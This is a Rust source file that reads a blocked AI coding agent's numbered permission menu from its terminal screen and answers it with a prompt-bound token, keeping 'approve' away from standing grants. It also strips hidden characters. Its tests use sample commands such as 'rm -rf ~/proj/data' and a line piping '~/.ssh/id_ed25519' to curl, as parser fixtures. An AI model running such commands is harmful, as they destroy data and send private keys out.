//! FORK(approval): answering a blocked agent's prompt from outside its pane
//! (cameronsjo/herdr-app#17). `herdr-app approval show <terminal>` reads
//! the menu on its screen and a token for that exact prompt;
//! `herdr-app approval answer <terminal> <answer> --token <t>` presses the
//! answer's key only while the agent is still blocked on that same prompt.
//! Without the screen check this would be a blind send-keys: the token is
//! what keeps an answer from landing on a prompt that changed.
//!
//! The menu is read from the screen (numbered options at the bottom, as
//! Claude Code and Codex draw them), so this works with any agent that
//! numbers its choices. Docs: `docs/fork/approval.md`.

use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use std::time::{Duration, Instant};

/// A numbered menu at the bottom of a blocked agent's screen.
#[derive(Clone, Debug, PartialEq)]
pub struct Prompt {
    /// What is being asked about: the lines above the question, up to a
    /// box's or rule's top edge. Claude Code shows the Bash command here, so
    /// all of it is part of the token and of what `show` prints.
    pub context: Vec<String>,
    /// Whether the context reaches a panel's top edge. False when the
    /// screen's top cut it off or no edge was drawn: some of what is asked
    /// may not be on screen, so `approve` and `deny` ask for a number.
    pub complete: bool,
    /// The line above the options (often the question), "" if none.
    pub question: String,
    /// The options, numbered from 1, in order.
    pub options: Vec<String>,
}

/// How many lines may sit below the menu (a hint such as "Esc to cancel",
/// a box's bottom edge, the input line).
const BELOW: usize = 6;

/// The most options a menu may have: answers are one digit.
const MAX_OPTIONS: usize = 9;

/// Screen text as shown to a caller: no control characters, no bidi
/// formatting and no invisible characters, which could make a label read as
/// something else.
fn clean(s: &str) -> String {
    s.chars()
        .filter(|c| {
            !c.is_control()
                && !matches!(
                    *c,
                    '\u{ad}' | '\u{34f}' | '\u{61c}' | '\u{115f}' | '\u{1160}' | '\u{17b4}' | '\u{17b5}' | '\u{180b}'..='\u{180e}' | '\u{200b}'..='\u{200f}' | '\u{2028}' | '\u{2029}' | '\u{202a}'..='\u{202e}' | '\u{2060}'..='\u{206f}' | '\u{3164}' | '\u{fe00}'..='\u{fe0f}' | '\u{feff}' | '\u{ffa0}' | '\u{1d173}'..='\u{1d17a}' | '\u{e0000}'..='\u{e007f}'
                )
        })
        .collect()
}

/// A prompt panel's top edge: a box's top (`╭───╮`, `┌───┐`) or a bare
/// rule (`────`). A box's bottom, or a line that mixes corners, is content:
/// taking it as the top would hide the lines above it.
fn edge(line: &str) -> bool {
    let t = line.trim();
    // Box-drawing only: a `---` or `===` line is text (a diff, markdown).
    let rule = |c: char| matches!(c, '─' | '━' | '═');
    if t.is_empty() || !t.chars().any(rule) {
        return false;
    }
    let n = t.chars().count();
    let top = n > 2 && matches!(t.chars().next(), Some('╭' | '┌')) && matches!(t.chars().last(), Some('╮' | '┐')) && t.chars().skip(1).take(n - 2).all(rule);
    top || t.chars().all(rule)
}

/// The panel's top edge above the options at `first`. A panel's edge
/// starts in column 0 and spans the pane (`cols`, its width in columns):
/// Claude Code draws its rule that way and indents what it shows, so a rule
/// or a box inside a command never counts, and the lines above it still
/// belong to the prompt. Without the width, a bare rule counts only when it
/// is at least as wide as every line under it.
fn top_edge(lines: &[&str], first: usize, cols: Option<usize>) -> Option<usize> {
    (0..first).rev().find(|&i| {
        let line = lines[i].trim_end();
        if !edge(line) || line.starts_with(char::is_whitespace) {
            return false;
        }
        let wide = line.chars().count();
        match cols {
            // A column or two of slack for a pane's own edge.
            Some(cols) => wide + 2 >= cols,
            None => !line.chars().all(|c| matches!(c, '─' | '━' | '═')) || lines[i + 1..first].iter().all(|l| l.trim_end().chars().count() <= wide),
        }
    })
}

/// One screen line without a box's edges and the padding inside them. A
/// line of box-drawing alone (a box's top or bottom, a rule) is empty. A box
/// side is taken off only when the line has one at each end: a `|` or a
/// rule character at the end of a command is the command's.
fn unboxed(line: &str) -> &str {
    let t = line.trim();
    if t.chars().all(|c| EDGES.contains(&c)) {
        return "";
    }
    match (t.chars().next(), t.chars().last()) {
        (Some(a), Some(b)) if SIDES.contains(&a) && SIDES.contains(&b) && t.chars().count() > 1 => t[a.len_utf8()..t.len() - b.len_utf8()].trim(),
        _ => t,
    }
}

/// A box's left and right sides.
const SIDES: &[char] = &['│', '┃', '║'];

/// Every box-drawing character a frame line is made of.
const EDGES: &[char] = &['│', '┃', '║', '╭', '╮', '╰', '╯', '─', '━', '═', '┌', '┐', '└', '┘', '├', '┤', '╞', '╡'];

/// How far in a line's text starts, inside a box's left edge.
fn indent(line: &str) -> usize {
    let inside = line.trim_start().strip_prefix(SIDES).unwrap_or(line);
    inside.chars().take_while(|c| !c.is_ascii_digit() && !c.is_alphanumeric()).count()
}

/// `n` and the label of an option line: `1. Yes`, `❯ 2) No`, `› 3. Skip`.
fn option(line: &str) -> Option<(usize, String)> {
    let rest = unboxed(line).trim_start_matches(['❯', '›', '>', '▶', '▸', '●', '○', '◉', '*', '-', ' ']);
    let digits = rest.chars().take_while(char::is_ascii_digit).count();
    if digits == 0 || digits > 2 {
        return None;
    }
    let n: usize = rest[..digits].parse().ok()?;
    let after = rest[digits..].strip_prefix(['.', ')'])?;
    if !after.starts_with(' ') {
        return None;
    }
    let label = after.trim();
    (!label.is_empty()).then(|| (n, label.to_owned()))
}

/// The numbered menu nearest the bottom of `screen`: options 1..=N (at
/// least two) on consecutive lines, at most [`BELOW`] non-blank lines under
/// them. `cols` is the pane's width, when the core says it. None when the
/// screen shows no such menu.
pub fn parse(screen: &str, cols: Option<usize>) -> Option<Prompt> {
    let lines: Vec<&str> = screen.lines().collect();
    let end = lines.iter().rposition(|l| !unboxed(l).is_empty())? + 1;
    let floor = end.saturating_sub(BELOW + 40);
    // The last option line, then the run of options that ends there.
    let mut last = None;
    let mut below = 0;
    for i in (floor..end).rev() {
        if option(lines[i]).is_some() {
            last = Some(i);
            break;
        }
        if !unboxed(lines[i]).is_empty() {
            below += 1;
            if below > BELOW {
                return None;
            }
        }
    }
    let last = last?;
    // Up through the run: option lines, and between them lines indented
    // deeper than the option below them (a wrapped label, a description),
    // which join the label above.
    let mut first = last;
    let mut below_indent = indent(lines[last]);
    let mut i = last;
    while i > floor {
        let up = lines[i - 1];
        if option(up).is_some() {
            first = i - 1;
            below_indent = indent(up);
        } else if unboxed(up).is_empty() || indent(up) <= below_indent {
            break;
        }
        i -= 1;
    }
    // Lines under the last option, indented deeper, are its too.
    let last_indent = indent(lines[last]);
    let tail = lines[last + 1..end].iter().take_while(|l| !unboxed(l).is_empty() && indent(l) > last_indent).count();
    let mut options: Vec<(usize, String)> = Vec::new();
    for l in &lines[first..=last + tail] {
        match (option(l), options.last_mut()) {
            (Some(o), _) => options.push(o),
            (None, Some((_, label))) => {
                label.push(' ');
                label.push_str(unboxed(l));
            }
            (None, None) => {}
        }
    }
    if options.len() < 2 || options.len() > MAX_OPTIONS || options.iter().enumerate().any(|(i, (n, _))| *n != i + 1) {
        return None;
    }
    // The question, then its context up to the panel's top edge.
    let top = top_edge(&lines, first, cols);
    let mut above = lines[top.map_or(0, |t| t + 1)..first].iter().rev().map(|l| clean(unboxed(l))).filter(|l| !l.is_empty());
    let question = above.next().unwrap_or_default();
    let mut context: Vec<String> = above.collect();
    context.reverse();
    let complete = top.is_some() && !context.is_empty();
    Some(Prompt { context, complete, question, options: options.into_iter().map(|(_, l)| clean(&l)).collect() })
}

/// The token for one prompt: the terminal, its turn (the core counts one
/// each time the agent stops working, so the next prompt after an answer is
/// a new turn), and everything the prompt shows.
pub fn token(terminal: &str, turn: u64, p: &Prompt) -> String {
    let mut h = Sha256::new();
    let turn = turn.to_string();
    let head = [terminal, turn.as_str(), "\u{1}"].into_iter();
    let complete = if p.complete { "complete" } else { "cut" };
    let parts = head.chain([complete]).chain(p.context.iter().map(String::as_str)).chain(["\u{1}", p.question.as_str()]).chain(p.options.iter().map(String::as_str));
    for part in parts {
        h.update(part.as_bytes());
        h.update([0]);
    }
    h.finalize().iter().take(8).map(|b| format!("{b:02x}")).collect()
}

/// Words that make an option a standing grant, not a one-time answer.
const STANDING: &[&str] = &[
    "always", "don't ask", "dont ask", "do not ask", "again", "session", "all ", "every", "remember", "bypass", "auto-accept", "auto accept", "auto-approve", "auto approve", "auto mode", "accept edits", "without asking", "permanent", "trust", "for this project", "in the future",
];

/// The whole labels `approve` takes, after [`plain`]: answers that grant
/// this once and nothing more. Anything else (a grant this list doesn't
/// know, a label cut short) needs its number.
const ONCE: &[&str] = &["yes", "allow", "approve", "proceed", "allow once", "approve once", "allow this once", "yes, once", "yes, proceed", "yes, allow once", "yes, just this once", "yes, allow this once"];

/// A label as `approve` and `deny` compare it: lower case, straight
/// apostrophes, no trailing key hint (`(y)`, `(esc)`, `(shift+tab)`) or
/// full stop. Only a key hint comes off: "Yes (always)" stays as it is.
fn plain(label: &str) -> String {
    let o = label.to_lowercase().replace('’', "'");
    let o = o.trim();
    let key = |k: &str| k.chars().count() == 1 || matches!(k, "esc" | "enter" | "tab" | "shift+tab" | "space");
    let o = match o.strip_suffix(')').and_then(|r| r.rsplit_once(" (")) {
        Some((rest, hint)) if key(hint) => rest,
        _ => o,
    };
    o.trim_end_matches('.').trim().to_owned()
}

/// Whether a label, as shown, says it grants or sets something for later.
fn standing(label: &str) -> bool {
    let o = label.to_lowercase().replace('’', "'");
    STANDING.iter().any(|s| o.contains(s)) || o.ends_with(" all") || o.contains(" all)")
}

/// The option an answer means: a number, `approve` (the one option whose
/// whole label is a one-time yes, [`ONCE`]) or `deny` (the one that starts
/// with no, deny or reject and sets nothing for later). More than one match
/// asks for a number.
pub fn choose(p: &Prompt, answer: &str) -> Result<usize, String> {
    let one = |words: &[&str], what: &str| -> Result<usize, String> {
        let found: Vec<usize> = (0..p.options.len())
            .filter(|&i| {
                let o = plain(&p.options[i]);
                // Never a label that says it lasts, however it is worded.
                if standing(&p.options[i]) {
                    return false;
                }
                if what == "approves" {
                    return ONCE.contains(&o.as_str());
                }
                words.iter().any(|w| o == *w || o.starts_with(&format!("{w} ")) || o.starts_with(&format!("{w},")) || o.starts_with(&format!("{w}.")))
            })
            .collect();
        // Several: only a bare "Yes" (or "Yes (y)") is clearly the plain one.
        let bare = |i: &usize| words.contains(&plain(&p.options[*i]).as_str());
        let found = if found.len() > 1 { found.iter().copied().filter(bare).collect() } else { found };
        match found[..] {
            [i] => Ok(i + 1),
            [] if what == "approves" => Err("no option here is a plain one-time yes (\"Yes\", \"Allow\", \"Yes, proceed\"…): answer with its number".to_owned()),
            [] => Err(format!("no option here {what} once (none starts with {}): answer with its number", words.join(", "))),
            _ => Err(format!("more than one option here {what}: answer with its number")),
        }
    };
    let named = matches!(answer, "approve" | "yes" | "allow" | "deny" | "no" | "reject");
    if named && !p.complete {
        return Err("part of this prompt may be off screen (no top edge found above it): read it in its pane and answer with its number".to_owned());
    }
    let n = match answer {
        "approve" | "yes" | "allow" => one(&["yes", "allow", "approve"], "approves")?,
        "deny" | "no" | "reject" => one(&["no", "deny", "reject"], "denies")?,
        n => n.parse::<usize>().map_err(|_| format!("answer {n:?}: give an option's number, approve or deny"))?,
    };
    if n == 0 || n > p.options.len() {
        return Err(format!("there is no option {n} here (1 to {})", p.options.len()));
    }
    Ok(n)
}

/// What `show` prints for a blocked terminal's prompt.
pub fn shown(terminal: &str, kind: Option<&str>, turn: u64, p: &Prompt) -> Value {
    let options: Vec<Value> = p.options.iter().enumerate().map(|(i, l)| json!({ "n": i + 1, "label": l })).collect();
    json!({ "terminal": terminal, "kind": kind, "context": p.context, "complete": p.complete, "question": p.question, "options": options, "token": token(terminal, turn, p) })
}

/// The terminal's word (its program's 7501 state) and blocked kind, from a
/// `terminal.get` reply.
fn state(rec: &Value) -> (Option<&str>, Option<&str>) {
    let status = rec.get("status");
    let word = status.and_then(|s| s.get("state")).and_then(Value::as_str).or_else(|| status.and_then(Value::as_str));
    (word, status.and_then(|s| s.get("kind")).and_then(Value::as_str))
}

/// Why `approval` stopped: the exit code and the message.
type Stop = (i32, String);

/// Exit 1: the core or the request failed.
fn failed(e: impl std::fmt::Display) -> Stop {
    (1, e.to_string())
}

/// The core calls `approval` makes, so tests can answer them.
pub trait Rpc {
    fn call_timeout(&self, method: &str, params: Value, timeout: Duration) -> anyhow::Result<Value>;

    fn call(&self, method: &str, params: Value) -> anyhow::Result<Value> {
        self.call_timeout(method, params, Duration::from_secs(10))
    }
}

impl Rpc for crate::hc::Core {
    fn call_timeout(&self, method: &str, params: Value, timeout: Duration) -> anyhow::Result<Value> {
        crate::hc::Core::call_timeout(self, method, params, timeout)
    }
}

/// Which blocked kinds this answers. A program that says what it is blocked
/// on (OSC 7501 `kind`) gets an answer only for a permission prompt or a
/// question; a sign-in (`auth`) or a kind this doesn't know is answered in
/// its pane. A program that says no kind is read from its screen alone.
fn answerable(terminal: &str, kind: Option<&str>) -> Result<(), Stop> {
    match kind {
        None | Some("permission" | "question") => Ok(()),
        Some(kind) => Err((3, format!("terminal {terminal} is blocked on {kind:?}, not on a permission prompt or a question: answer it in its pane"))),
    }
}

/// The prompt a terminal is blocked on now, with its kind and turn. Exit 3
/// when there is nothing to answer.
fn current(core: &dyn Rpc, terminal: &str) -> Result<(Option<String>, u64, Prompt), Stop> {
    let rec = core.call("terminal.get", json!({ "terminal": terminal })).map_err(|e| failed(format!("{e:#}")))?;
    let (word, kind) = state(&rec);
    if word != Some("blocked") {
        return Err((3, format!("terminal {terminal} is not blocked (it is {}): nothing to answer", word.unwrap_or("not an agent"))));
    }
    answerable(terminal, kind)?;
    let kind = kind.map(str::to_owned);
    let turn = rec.get("turn").and_then(Value::as_u64).ok_or_else(|| failed(format!("the core did not say terminal {terminal}'s turn: this core is too old to answer prompts safely")))?;
    let cols = rec.get("cols").and_then(Value::as_u64).map(|c| c as usize);
    let read = core.call("terminal.read", json!({ "terminal": terminal, "lines": 0 })).map_err(|e| failed(format!("{e:#}")))?;
    let text = read.get("text").and_then(Value::as_str).unwrap_or_default();
    let p = parse(text, cols).ok_or_else(|| (3, format!("terminal {terminal} is blocked, but its screen shows no numbered options: answer it in its pane")))?;
    Ok((kind, turn, p))
}

/// How long `answer` waits for the key to go in, unless `--wait` says. The
/// core holds it for as long as a person keeps typing in that pane and
/// can't take it back, so `answer` waits for the reply and checks it; only
/// a lost core ends this sooner.
const KEYS_WAIT: Duration = Duration::from_secs(24 * 60 * 60);

/// `answer`'s arguments, flags anywhere.
#[derive(Debug, PartialEq)]
struct AnswerArgs<'a> {
    terminal: &'a str,
    answer: &'a str,
    token: &'a str,
    /// `--wait <secs>`: how long to wait for the key to go in.
    wait: Option<Duration>,
}

fn answer_args(rest: &[String]) -> Option<AnswerArgs<'_>> {
    let mut token = None;
    let mut wait = None;
    let mut plain = Vec::new();
    let mut it = rest.iter();
    let secs = |s: &str| s.parse::<u64>().ok().filter(|&n| n > 0).map(Duration::from_secs);
    while let Some(a) = it.next() {
        if a == "--token" {
            token = Some(it.next()?.as_str());
        } else if let Some(t) = a.strip_prefix("--token=") {
            token = Some(t);
        } else if a == "--wait" {
            wait = Some(secs(it.next()?)?);
        } else if let Some(w) = a.strip_prefix("--wait=") {
            wait = Some(secs(w)?);
        } else {
            plain.push(a.as_str());
        }
    }
    match (plain.as_slice(), token) {
        ([terminal, answer], Some(token)) => Some(AnswerArgs { terminal, answer, token, wait }),
        _ => None,
    }
}

fn answer(core: &dyn Rpc, args: &AnswerArgs) -> Result<Value, Stop> {
    let AnswerArgs { terminal, answer, token: want, wait } = *args;
    let (kind, turn, p) = current(core, terminal)?;
    if token(terminal, turn, &p) != want {
        return Err((3, format!("terminal {terminal}'s prompt changed since that token: run herdr-app approval show {terminal} again")));
    }
    if matches!(answer, "approve" | "yes" | "allow" | "deny" | "no" | "reject") && kind.as_deref().is_some_and(|k| k != "permission") {
        return Err((2, format!("terminal {terminal} is asking a {}, not for permission: answer with an option's number", kind.unwrap_or_default())));
    }
    let n = choose(&p, answer).map_err(|e| (2, e))?;
    // The core holds keys while a person types in the pane, and a person
    // answering there moves the agent on: its turn then differs, and this
    // key went to whatever came next.
    let started = Instant::now();
    let sent = core.call_timeout("terminal.keys", json!({ "terminal": terminal, "keys": [n.to_string()] }), wait.unwrap_or(KEYS_WAIT)).map_err(|e| {
        let queued = format!("the key {n} may still be queued for terminal {terminal}; the core presses it 3 s after typing in that pane stops and it can't be cancelled, so it may answer a later prompt: check the pane");
        match wait {
            // Ran out of the caller's time: the key is still waiting for the pane to go quiet.
            Some(w) if started.elapsed() >= w => (4, format!("no reply within {} s: {queued}", w.as_secs())),
            _ => failed(format!("{e:#}: {queued}")),
        }
    })?;
    // No turn in the reply: nothing to check against, so not "answered".
    let at = sent.get("turn").and_then(Value::as_u64);
    let word = sent.get("status").and_then(Value::as_str);
    // No status means the program no longer reports blocked: not "answered".
    if at != Some(turn) || word != Some("blocked") {
        return Err((4, format!("pressed {n} on terminal {terminal}, but it moved on while the key waited for typing in its pane to stop: the key may have answered a later prompt; check the pane")));
    }
    Ok(json!({ "terminal": terminal, "answered": n, "label": p.options[n - 1] }))
}

/// `herdr-app approval show|answer ...`: JSON on stdout, an error on stderr.
/// Exit 0 on success, 1 when the core fails, 2 on usage or an answer that
/// names no option, 3 when there is nothing to answer or the token is
/// stale (run `show` again), 4 when the key may have gone to a later prompt.
pub fn main(args: &[String]) -> i32 {
    const USAGE: &str = "usage: herdr-app approval show <terminal> | herdr-app approval answer <terminal> <number|approve|deny> --token <token> [--wait <secs>]";
    let run = |f: &dyn Fn(&dyn Rpc) -> Result<Value, Stop>| -> i32 {
        // The core the window uses: the person's configured one, else the
        // usual places, as the window finds it.
        let person = crate::settings::load_person();
        let Some(bin) = crate::core_bin::find(person.as_ref().ok().and_then(|p| p.core.as_deref())) else {
            eprintln!("herdr-app: herdr-core is not installed: open Herdr to set it up");
            return 1;
        };
        crate::core_bin::use_core(bin);
        match crate::hc::Core::connect().map_err(|e| failed(format!("{e:#}"))).and_then(|core| f(core.as_ref())) {
            Ok(v) => {
                println!("{v}");
                0
            }
            Err((code, e)) => {
                eprintln!("herdr-app: {e}");
                code
            }
        }
    };
    match args {
        [verb, terminal] if verb == "show" => run(&|core| current(core, terminal).map(|(kind, turn, p)| shown(terminal, kind.as_deref(), turn, &p))),
        [verb, rest @ ..] if verb == "answer" => match answer_args(rest) {
            Some(a) => run(&|core| answer(core, &a)),
            None => {
                eprintln!("herdr-app: {USAGE}");
                2
            }
        },
        _ => {
            eprintln!("herdr-app: {USAGE}");
            2
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn claude(command: &str) -> String {
        format!(
            "\
some earlier output
────────────────────────────────
 Bash command

   {command}

 Do you want to proceed?
 ❯ 1. Yes
   2. Yes, and don't ask again for rm commands in /src/app
   3. No, and tell Claude what to do differently (esc)

"
        )
    }

    fn menu(options: &[&str]) -> Prompt {
        Prompt { context: vec!["x".into()], complete: true, question: String::new(), options: options.iter().map(|o| o.to_string()).collect() }
    }

    #[test]
    fn a_numbered_menu_at_the_bottom_is_the_prompt() {
        let p = parse(&claude("rm -rf build/"), None).unwrap();
        assert_eq!(p.question, "Do you want to proceed?");
        assert_eq!(p.context, ["Bash command", "rm -rf build/"]);
        assert_eq!(p.options.len(), 3);
        assert_eq!(p.options[1], "Yes, and don't ask again for rm commands in /src/app");
        // In a box, with a hint below: the box's top edge ends the context.
        let boxed = "earlier output\n╭────────╮\n│ Edit src/a.rs           │\n│ Allow this edit?        │\n│ › 1. Allow              │\n│   2) Deny               │\n╰────────╯\n  Esc to cancel\n";
        assert_eq!(parse(boxed, None), Some(Prompt { context: vec!["Edit src/a.rs".into()], complete: true, question: "Allow this edit?".into(), options: vec!["Allow".into(), "Deny".into()] }));
        // A wrapped label and a description join the option above.
        let wrapped = "Pick one\n 1. Yes\n      the plain one\n 2. Yes, and don't ask again for git\n    commands in /src/app\n 3. No\n";
        assert_eq!(parse(wrapped, None).unwrap().options, ["Yes the plain one", "Yes, and don't ask again for git commands in /src/app", "No"]);
        let boxed_wrap = "╭──╮\n│ Go?            │\n│ ❯ 1. Yes, and don't ask │\n│      again          │\n│   2. No             │\n╰──╯\n";
        assert_eq!(parse(boxed_wrap, None).unwrap().options, ["Yes, and don't ask again", "No"]);
        // The whole command is context, however long; `---` inside it is
        // text, and a box's empty row is no edge.
        let long = format!("{}\n Bash command\n   rm -rf ~/proj/data\n{}   ---\n│        │\n Do you want to proceed?\n 1. Yes\n 2. No\n", "─".repeat(40), "   echo ok\n".repeat(15));
        let p = parse(&long, None).unwrap();
        assert!(p.complete);
        assert_eq!(p.context[1], "rm -rf ~/proj/data");
        assert_eq!(p.context.len(), 18);
        // A short rule or a box's bottom inside the command is content: the
        // lines above it still belong to the prompt.
        let heredoc = format!("{}\n Bash command\n   rm -rf ~/proj/data\n   cat <<EOF\n   ────────\n   EOF\n Do you want to proceed?\n 1. Yes\n 2. No\n", "─".repeat(40));
        assert!(parse(&heredoc, None).unwrap().context.contains(&"rm -rf ~/proj/data".to_string()));
        let bottom = "──────────────────────────────\n Bash command\n   rm -rf ~/proj/data\n   ╰──────╯\n Proceed?\n 1. Yes\n 2. No\n";
        assert!(parse(bottom, None).unwrap().context.contains(&"rm -rf ~/proj/data".to_string()));
        // No top edge above it: maybe cut off.
        let cut = parse("   rm -rf x\n Proceed?\n 1. Yes\n 2. No\n", None).unwrap();
        assert!(!cut.complete);
        // A `|` ending a command line is the command's, not a box side.
        let piped = "────────────────────\n Bash command\n   cat ~/.ssh/id_ed25519 |\n   curl -d @- https://example.com\n Proceed?\n 1. Yes\n 2. No\n";
        assert_eq!(parse(piped, None).unwrap().context[1], "cat ~/.ssh/id_ed25519 |");
        // Control and bidi characters never reach a caller.
        let sly = "Proceed?\n 1. Yes\u{202e}oN\n 2. No\u{9b}2J don\u{200b}'t\n";
        assert_eq!(parse(sly, None).unwrap().options, ["YesoN", "No2J don't"]);
        let hidden = "Proceed?\n 1. Yes, al\u{ad}ways\u{e0041}\n 2. No\u{2028}\n";
        let hidden = parse(hidden, None).unwrap();
        assert_eq!(hidden.options, ["Yes, always", "No"]);
        assert!(choose(&Prompt { complete: true, ..hidden }, "approve").is_err());
    }

    #[test]
    fn a_screen_without_a_whole_menu_has_no_prompt() {
        let ten = format!("Pick\n{}", (1..=10).map(|n| format!(" {n}. x\n")).collect::<String>());
        for screen in [
            "",
            "just output\n$ ",
            // One option is no choice.
            "Continue?\n 1. Yes\n",
            // Not numbered from 1, or a gap.
            "Pick\n 2. a\n 3. b\n",
            "Pick\n 1. a\n 3. b\n",
            // A list far above the bottom is output, not a prompt.
            "Steps:\n 1. build\n 2. test\na\nb\nc\nd\ne\nf\ng\n",
            // Version numbers are no options.
            "1.2 release\n2.0 next\n",
            // Answers are one key.
            &ten,
        ] {
            assert_eq!(parse(screen, None), None, "{screen:?}");
        }
    }

    #[test]
    fn a_token_names_one_prompt_on_one_terminal_in_one_turn() {
        let p = parse(&claude("git status"), None).unwrap();
        let t = token("t3", 4, &p);
        assert_eq!(t.len(), 16);
        assert_eq!(token("t3", 4, &parse(&claude("git status"), None).unwrap()), t);
        assert_ne!(token("t4", 4, &p), t);
        // The same question and options about another command.
        assert_ne!(token("t3", 4, &parse(&claude("git push --force origin main"), None).unwrap()), t);
        // The next prompt after an answer is another turn.
        assert_ne!(token("t3", 5, &p), t);
        let shown = shown("t3", Some("permission"), 4, &p);
        assert_eq!(shown["token"], t);
        assert_eq!(shown["context"][1], "git status");
        assert_eq!(shown["options"][2]["n"], 3);
    }

    #[test]
    fn answers_name_one_plain_option() {
        let p = parse(&claude("ls"), None).unwrap();
        assert_eq!(choose(&p, "approve"), Ok(1));
        assert_eq!(choose(&p, "deny"), Ok(3));
        assert_eq!(choose(&p, "2"), Ok(2));
        assert!(choose(&p, "4").is_err());
        assert!(choose(&p, "0").is_err());
        assert!(choose(&p, "always").is_err());
        assert!(choose(&menu(&["Run it", "Skip"]), "approve").is_err(), "no option says yes");
        assert!(choose(&menu(&["Run it", "Skip"]), "deny").is_err());
        // "Nothing" doesn't start with the word "no".
        assert!(choose(&menu(&["Yes", "Nothing else"]), "deny").is_err());
        // A standing grant is never "approve", wherever it is listed.
        assert_eq!(choose(&menu(&["Yes, and don't ask again", "Yes", "No"]), "approve"), Ok(2));
        assert!(choose(&menu(&["Allow always", "Allow for this session", "Deny"]), "approve").is_err());
        assert!(choose(&menu(&["Yes, and bypass permissions", "No"]), "approve").is_err());
        // Only a whole one-time label: a grant the word list doesn't know,
        // or a label cut short, is never `approve`.
        for standing in [
            "Yes, and switch to auto mode",
            "Yes, and switch to accept edits",
            "Yes, and allow this host in the future",
            "Yes, allow all",
            "Yes, from now on",
            "Yes, for this directory",
            "Yes, and …",
            "Yes, al\u{ad}ways",
            "Yes (always)",
            "Allow (session)",
            "Yes (for now on)",
            "Yes (all)",
            "Yes (permanent)",
            "Yes (for session)",
        ] {
            assert!(choose(&menu(&[standing, "No"]), "approve").is_err(), "{standing}");
        }
        assert_eq!(choose(&menu(&["Yes, just this once", "Yes, and don't ask again for this command in this session", "No, and tell Codex what to do differently"]), "approve"), Ok(1));
        assert_eq!(choose(&menu(&["Allow once (a)", "Deny"]), "approve"), Ok(1));
        // `deny` never sets anything for later either.
        assert!(choose(&menu(&["Yes", "No (always)"]), "deny").is_err());
        assert_eq!(choose(&menu(&["Yes (y)", "No (esc)"]), "deny"), Ok(2));
        assert_eq!(choose(&menu(&["Yes", "No, and block this host in the future", "No, and tell Codex what to do differently"]), "deny"), Ok(3));
        // Several plain yeses: only a bare one is clear.
        assert!(choose(&menu(&["Yes, run it", "Yes, but in a sandbox", "No"]), "approve").is_err());
        assert_eq!(choose(&menu(&["Yes, proceed (y)", "Yes (y)", "No"]), "approve"), Ok(2));
        assert!(choose(&menu(&["Yes, and don\u{2019}t ask again", "No"]), "approve").is_err(), "a curly apostrophe");
        // A prompt that may be cut off takes only a number.
        let mut cut = menu(&["Yes", "No"]);
        cut.complete = false;
        assert!(choose(&cut, "approve").is_err() && choose(&cut, "deny").is_err());
        assert_eq!(choose(&cut, "1"), Ok(1));
    }

    #[test]
    fn answer_takes_its_flags_anywhere() {
        let args = |a: &[&str]| a.iter().map(|s| s.to_string()).collect::<Vec<_>>();
        let got = |a: &[&str]| answer_args(&args(a)).map(|a| (a.terminal.to_owned(), a.answer.to_owned(), a.token.to_owned(), a.wait.map(|w| w.as_secs())));
        let want = |t: &str, a: &str, k: &str, w: Option<u64>| Some((t.to_owned(), a.to_owned(), k.to_owned(), w));
        assert_eq!(got(&["t3", "approve", "--token", "ab"]), want("t3", "approve", "ab", None));
        assert_eq!(got(&["t3", "--token", "ab", "1"]), want("t3", "1", "ab", None));
        assert_eq!(got(&["--token=ab", "t3", "deny"]), want("t3", "deny", "ab", None));
        assert_eq!(got(&["t3", "--wait", "30", "1", "--token", "ab"]), want("t3", "1", "ab", Some(30)));
        assert_eq!(got(&["--wait=5", "t3", "1", "--token=ab"]), want("t3", "1", "ab", Some(5)));
        for bad in [
            &["t3", "approve"][..],
            &["t3", "approve", "--token"],
            &["t3", "--token", "ab"],
            &["t3", "1", "2", "--token", "ab"],
            &["t3", "1", "--token", "ab", "--wait"],
            &["t3", "1", "--token", "ab", "--wait", "0"],
            &["t3", "1", "--token", "ab", "--wait=soon"],
        ] {
            assert_eq!(got(bad), None, "{bad:?}");
        }
    }

    #[test]
    fn only_a_blocked_terminal_has_something_to_answer() {
        assert_eq!(state(&json!({ "status": { "state": "blocked", "kind": "permission" } })), (Some("blocked"), Some("permission")));
        assert_eq!(state(&json!({ "status": null })), (None, None));
        assert_eq!(state(&json!({ "status": "working" })), (Some("working"), None));
    }

    /// Captured from Claude Code 2.1.328 in a 100-column tmux pane
    /// (`tmux capture-pane -p`), trailing spaces trimmed.
    const CLAUDE_BASH: &str = include_str!("fixtures/claude-bash.txt");
    const CLAUDE_EDIT: &str = include_str!("fixtures/claude-edit.txt");

    #[test]
    fn live_claude_code_dialogs_parse_whole() {
        let bash = parse(CLAUDE_BASH, Some(100)).unwrap();
        assert!(bash.complete);
        assert_eq!(bash.question, "Do you want to proceed?");
        assert_eq!(bash.context.first().map(String::as_str), Some("Bash command"));
        assert!(bash.context.iter().any(|l| l == "rm -f notes.txt"), "{:?}", bash.context);
        assert!(!bash.context.iter().any(|l| l.contains("Run exactly")), "the conversation above the rule is not the prompt");
        assert_eq!(bash.options.len(), 4);
        assert_eq!(choose(&bash, "approve"), Ok(1));
        assert_eq!(choose(&bash, "deny"), Ok(4));
        let edit = parse(CLAUDE_EDIT, Some(100)).unwrap();
        assert!(edit.complete);
        assert_eq!(edit.context, ["Edit file", "notes.txt", &"╌".repeat(100), "1 -hello", "1 +goodbye", &"╌".repeat(100)]);
        assert_eq!(edit.options[1], "Yes, and switch to accept edits (auto-approve file edits and common file commands) for this session (shift+tab)");
        assert_eq!(choose(&edit, "approve"), Ok(1));
        assert_eq!(choose(&edit, "deny"), Ok(3));
        // In a pane wider than that rule, the rule is not the panel's edge.
        assert!(!parse(CLAUDE_BASH, Some(140)).unwrap().complete);
        // A core that doesn't say the width: the rule is still the widest line.
        for screen in [CLAUDE_BASH, CLAUDE_EDIT] {
            let p = parse(screen, None).unwrap();
            assert!(p.complete && p.context.first().is_some_and(|l| l.ends_with(" command") || l == "Edit file"), "{:?}", p.context);
        }
    }

    #[test]
    fn a_rule_inside_a_command_is_no_top_edge() {
        let rule = "─".repeat(60);
        // An indented rule, as wide as the pane, and an indented box: both
        // are the command's, so the command stays in the context.
        for inner in [format!("   {rule}"), format!("   ╭{}╮", "─".repeat(56))] {
            let screen = format!("{rule}\n Bash command\n   rm -rf ~/proj/data\n{inner}\n   echo done\n Do you want to proceed?\n ❯ 1. Yes\n   2. No\n");
            let p = parse(&screen, Some(60)).unwrap();
            assert!(p.complete);
            assert_eq!(p.context[..2], ["Bash command", "rm -rf ~/proj/data"], "{inner}");
        }
